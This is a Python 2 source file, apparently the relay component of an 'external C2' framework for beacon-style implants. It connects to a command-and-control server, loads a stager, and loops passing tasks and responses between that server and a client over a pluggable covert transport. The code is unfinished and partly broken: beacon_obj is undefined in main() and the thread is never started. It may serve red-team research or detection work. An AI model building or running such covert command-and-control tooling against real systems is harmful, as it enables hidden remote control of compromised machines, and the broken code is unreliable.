import sys
import argparse
from utils import commonUtils
import configureStage
import establishedSession
import config
from time import sleep
import beacon
import threading
import Queue

def importModule(modName, modType):
	"""
	Imports a passed module as either an 'encoder' or a 'transport'; called with either encoder.X() or transport.X()
	"""
	prep_global = "global " + modType
	exec(prep_global)
	importName = "import utils." + modType + "s." + modName + " as " + modType
	exec(importName, globals())


def task_loop(beacon_obj):
	"""
	This function should definitely be called as a thread

	:param beacon_obj: An already declared beacon.Beacon object, Beacon.beacon_id should already be defined.
	:return:
	"""

	# Start with logic to setup the connection to the external_c2 server
	beacon_obj.sock = commonUtils.createSocket()

	# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
	# Poll covert channel for 'READY2INJECT' message from client
	#       * We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
	# if args.verbose:
	#       print commonUtils.color("Client ready to recieve stager")

	# #####################

	# Prep the transport module
	prep_trans = transport.prepTransport() # TODO: Consider whether this needs to be outside this function.

	# Let's get the stager from the c2 server
	stager_status = configureStage.loadStager(beacon_obj.sock)

	if stager_status != 0:
		# Something went horribly wrong
		print commonUtils.color("Beacon {}: Something went terribly wrong while configuring the stager!", status=False,
								warning=True).format(beacon_obj.beacon_id)
		sys.exit(1) # TODO: Have this instead exit the thread, rather than the application

	# TODO: Add logic that will check and recieve confirmation from the client that it is ready to recieve and process commands
	# Poll covert channel for 'READY4CMDS' message from client

	# Now that the stager is configured, lets start our main loop for the beacon
	while True:
		if config.verbose:
			print commonUtils.color("Beacon {}: Checking the c2 server for new tasks...").format(beacon_obj.beacon_id)

		newTask = establishedSession.checkForTasks(beacon_obj.sock)

		# once we have a new task (even an empty one), lets relay that to our client
		if config.debug:
			print commonUtils.color("Beacon {}: Encoding and relaying task to client", status=False, yellow=True).format(beacon_obj.beacon_id)
		establishedSession.relayTask(newTask)
		# Attempt to retrieve a response from the client
		if config.verbose:
			print commonUtils.color("Beacon {}: Checking the client for a response...").format(beacon_obj.beacon_id)
		b_response = establishedSession.checkForResponse()

		# Let's relay this response to the c2 server
		establishedSession.relayResponse(beacon_obj.sock, b_response)
		sleep(beacon_obj.block_time / 100)  # python sleep is in seconds, C2_BLOCK_TIME in milliseconds

def main():
	# Argparse for certain options
	parser = argparse.ArgumentParser()
	parser.add_argument('-v', action='store_true', help='Enable verbose output', dest='verbose', default=False)
	parser.add_argument('-d', action='store_true', help='Enable debugging output', dest='debug', default=False)


	# Call arguments with args.$ARGNAME
	args = parser.parse_args()

	# Assign the arguments to config.$ARGNAME
	if not config.verbose:
		config.verbose = args.verbose
	if not config.debug:
		config.debug = args.debug

	# Enable verbose output if debug is enabled
	if config.debug:
		config.verbose = True

	# Import our defined encoder and transport modules
	if config.verbose:
		print (commonUtils.color("Importing encoder module: ") + "%s") % (config.ENCODER_MODULE)
	importModule(config.ENCODER_MODULE, "encoder")
	commonUtils.importModule(config.ENCODER_MODULE, "encoder")
	if config.verbose:
		print (commonUtils.color("Importing transport module: ") + "%s") % (config.TRANSPORT_MODULE)
	importModule(config.TRANSPORT_MODULE, "transport")
	commonUtils.importModule(config.TRANSPORT_MODULE, "transport")

	# TODO: initialize active beacons list here

	# TODO: wrap rest of function in a perpetually repeating loop that repeats on config.C2_BLOCK_TIME?
	# TODO: add logic to check for new beacons here that will return a beacon.Beacon object
	# TODO: Determine best way to determine how long to sleep between checks for new beacons
	try:
		print commonUtils.color("Attempting to start session for beacon {}").format(beacon_obj.beacon_id)
		t = threading.Thread(target=task_loop, args=(beacon_obj))
		t.daemon=True

		# Restart this loop
	except KeyboardInterrupt:
		if config.debug:
			print commonUtils.color("\nClosing the socket to the c2 server") # TODO: Fix this message
		commonUtils.killSocket(beacon_obj.sock) # TODO Kill all sockets for every active beacon
		print commonUtils.color("\nExiting...", warning=True)
		sys.exit(0)

main()
